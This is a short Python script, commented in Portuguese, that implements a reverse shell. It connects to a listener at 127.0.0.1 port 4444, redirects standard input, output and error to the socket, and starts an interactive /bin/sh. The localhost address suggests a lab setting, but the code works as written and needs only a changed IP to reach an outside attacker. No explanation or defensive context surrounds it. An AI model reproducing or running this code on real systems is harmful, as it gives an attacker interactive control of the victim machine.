import socket
import os
import subprocess

# Configurações do Host Local
IP = "127.0.0.1"
PORT = 4444

def connect():
    try:
        # Cria o socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Conecta ao ouvinte
        s.connect((IP, PORT))
        
        # Redireciona os fluxos padrão (stdin, stdout, stderr) para o socket
        # 0 = entrada padrão, 1 = saída padrão, 2 = erro padrão
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Inicia o shell interativo
        subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        print(f"Erro na conexão: {e}")

if __name__ == "__main__":
    connect()